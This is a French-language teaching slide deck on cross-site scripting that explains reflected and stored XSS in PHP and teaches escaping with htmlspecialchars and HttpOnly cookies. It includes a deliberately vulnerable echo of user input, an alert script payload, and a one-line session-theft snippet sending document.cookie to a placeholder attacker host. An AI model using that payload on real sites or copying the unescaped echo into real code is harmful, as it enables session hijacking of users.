# Les failles XSS

## Quand le navigateur exécute l'utilisateur

Par [Valentin Brosseau](https://github.com/c4software) / [@c4software](http://twitter.com/c4software)

---

## Le navigateur est naïf

Il ne fait **aucune** différence entre :

- le HTML que **vous** avez écrit ;
- le HTML qui vient d'une **saisie utilisateur**.

Tout ce qui arrive dans la page, il l'exécute.

---

## Le code fautif

```php
echo "Bonjour " . $_GET['name'];
```

On réaffiche la saisie **telle quelle** dans la page.

---

## Question

Et si `name` vaut :

```html
<script>alert('XSS')</script>
```

À votre avis, que fait le navigateur ?

---

## Il l'exécute 🚨

Le script s'exécute dans le navigateur de **chaque visiteur**.

Ici une simple alerte… mais on peut faire bien pire.

---

## Deux familles

- **XSS réfléchi** : le code voyage dans l'**URL / un lien** (une victime à la fois).
- **XSS stocké** : le code est **enregistré en base** (tous les visiteurs).

Lequel est le plus dangereux ?

---

## Le stocké

Un seul commentaire piégé, et **chaque** visiteur de la page est touché.

---

## Le vrai danger : le vol de session

```javascript
new Image().src =
  "http://pirate.com/?c=" + document.cookie;
```

Le cookie de session part chez l'attaquant, qui se fait passer pour vous.

---

## La solution : échapper à l'affichage

```php
echo htmlspecialchars($_GET['name'], ENT_QUOTES, 'UTF-8');
```

`<script>` devient `&lt;script&gt;` : affiché comme **texte**, jamais exécuté.

---

## htmlspecialchars ≠ strip_tags

- `strip_tags()` : **supprime** les balises.
- `htmlspecialchars()` : **neutralise** les balises (recommandé à l'affichage).

On échappe au **moment de l'affichage**, pas seulement à l'enregistrement.

---

## Une défense en profondeur

Un cookie de session en `HttpOnly` :

```php
setcookie('session', $id, ['httponly' => true]);
```

Même en cas de XSS, `document.cookie` ne le voit plus.

---

## Récapitulatif

- Une XSS, c'est de la saisie **exécutée** par le navigateur.
- Réfléchi (URL) vs stocké (base) : le stocké touche tout le monde.
- On **échappe à l'affichage** : `htmlspecialchars`.
- Cookie `HttpOnly` en défense supplémentaire.

---

## Des questions ?

Place au TP 🚀
